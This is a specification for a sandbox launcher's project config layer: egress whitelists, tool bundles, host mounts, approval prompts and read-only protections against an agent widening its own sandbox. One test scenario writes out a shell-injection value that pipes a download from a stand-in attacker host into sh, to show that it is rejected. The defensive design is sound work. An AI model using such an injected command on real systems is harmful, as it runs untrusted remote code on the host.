# Spec Delta

## Purpose

Lets each project widen the sandbox only where it needs to: which tools it gets, which hosts it can reach, whether it can reach the Docker host, and which extra host folders it sees. Neither the agent nor a cloned repository can widen the sandbox on its own.

## ADDED Requirements

### Requirement: Config is layered defaults plus an optional project file

The resolved config SHALL be the repo's default config, with the project's `.sbx/config` applied on top if that file exists. A project with no `.sbx/config` SHALL get exactly the defaults. The shipped defaults SHALL enable no tools.

#### Scenario: Project without a config

- **WHEN** `sbx` is run in a folder with no `.sbx/config` and the defaults file is as shipped
- **THEN** the container has no tools installed, uses the default whitelist, and shows no approval prompt

#### Scenario: Project narrows egress

- **WHEN** `.sbx/config` contains `deny = developers.cloudflare.com`
- **THEN** that host is absent from the container's effective whitelist, and every other default host is still present

### Requirement: Only reach-widening settings are configurable

Config SHALL carry only settings that widen what the sandbox can reach: `tools`, `allow`, `deny`, `host-network`, and `mount`. Restrictions SHALL NOT be configurable. These include the firewall's default deny, the read-only rootfs, the read-only `.git` and `.sbx`, absent credentials, and the host-only guard.

#### Scenario: Config tries to lift a restriction

- **WHEN** a config file contains a key such as `git-readonly = off`
- **THEN** the launch aborts with an unknown-key error naming the file and line

### Requirement: Config is data, never code

The launcher SHALL parse config files as `key = value` lines and SHALL NOT source or execute them. An unknown key, a malformed line, a tool with no bundle, or a value that fails validation SHALL abort the launch with a message naming the file and line.

#### Scenario: Shell in a config value

- **WHEN** a project config line reads `allow = $(curl evil.example | sh)`
- **THEN** the launch aborts with an invalid-hostname error, and nothing in the value is executed on the host

#### Scenario: Unknown tool

- **WHEN** `.sbx/config` enables a tool for which this repo has no bundle
- **THEN** the launch aborts and lists the tools that are available

### Requirement: A project config is approved before it takes effect

The launcher SHALL show what the project config changes relative to the defaults: tools, hosts and IPv4 ranges, host-network, and mounts. It SHALL require interactive confirmation the first time it applies a project config and whenever that config's content changes. Without a terminal it SHALL refuse rather than apply an unapproved config.

#### Scenario: Cloned repository ships a config

- **WHEN** a freshly cloned project contains `.sbx/config` that allows extra hosts or mounts a folder
- **THEN** `sbx` lists them and starts nothing until the user confirms

#### Scenario: The config changed between launches

- **WHEN** `.sbx/config` changed since it was last approved, whoever changed it
- **THEN** the next launch asks for approval again before applying it

#### Scenario: Unapproved config with no terminal

- **WHEN** a non-interactive caller (such as the ACP script) launches a project whose config is unapproved
- **THEN** the launch fails with a message telling the user to run `sbx --up` interactively once

### Requirement: The project config is read-only inside the sandbox

When `.sbx/` exists in the workspace, it SHALL be mounted read-only inside the container, so that no process inside can modify the config that governs it.

#### Scenario: Agent tries to widen its own sandbox

- **WHEN** a process inside the container writes to `.sbx/config` or creates a file in `.sbx/`
- **THEN** the write fails with a read-only filesystem error

### Requirement: The effective whitelist is composed from config

The effective whitelist SHALL be the defaults' `allow` entries, plus the hostnames and IPv4 ranges of every enabled tool, plus the project's `allow` entries, minus its `deny` entries. A `deny` that removes an entry an enabled tool requires SHALL abort the launch.

#### Scenario: Enabling a tool brings its domains

- **WHEN** a project enables `claude` and allows nothing else
- **THEN** the effective whitelist contains the default domains plus Claude Code's API and telemetry hosts

#### Scenario: Agent whose model provider is the user's choice

- **WHEN** a project enables only `opencode` and allows nothing else
- **THEN** the effective whitelist contains the default domains plus opencode's model catalogue host and no model provider's API
- **AND** adding `allow = api.anthropic.com` (or another provider's host) is what lets opencode reach a model

#### Scenario: Denying a tool's domain

- **WHEN** a project enables `claude` and denies `api.anthropic.com`
- **THEN** the launch aborts and names the tool that requires the domain

### Requirement: Whitelist entries are hostnames or public IPv4 ranges

Every `allow` and `deny` entry, and every entry a tool bundle requires, SHALL be either a hostname or a public IPv4 address or CIDR range no wider than /16. A private, loopback, link-local, shared-address (CGNAT), or multicast range SHALL be rejected: the Docker host is reached through `host-network` only.

#### Scenario: Provider reached by address range

- **WHEN** `.sbx/config` has `allow = 203.0.113.0/24`
- **THEN** the approval prompt lists the range, and once approved, addresses in that range are reachable from inside the container

#### Scenario: Range that would reach a private network

- **WHEN** `.sbx/config` has `allow = 192.168.0.0/16`
- **THEN** the launch aborts with an error naming the file and line and the private range

#### Scenario: Range that is too wide

- **WHEN** `.sbx/config` has `allow = 8.0.0.0/8`
- **THEN** the launch aborts with an error naming the file and line and the /16 limit

### Requirement: Extra host folders are opt-in and read-only by default

A `mount = <absolute host path>[:rw]` entry SHALL bind that host folder at the same path inside the container, read-only unless `:rw` is given. The launcher SHALL refuse a path that does not exist, the root folder, a path inside the workspace's `.git` or `.sbx`, and a read-write mount of this sandbox repo, the launcher's state folder, or any ancestor of either.

#### Scenario: Read-only reference folder

- **WHEN** `.sbx/config` has `mount = /home/<user>/docs`
- **THEN** the folder is readable inside the container, and writes to it fail

#### Scenario: Mount that would let the agent rewrite the sandbox

- **WHEN** `.sbx/config` has `mount = /home/<user>:rw`, an ancestor of the sandbox repo
- **THEN** the launch aborts and names the protected path the mount would expose
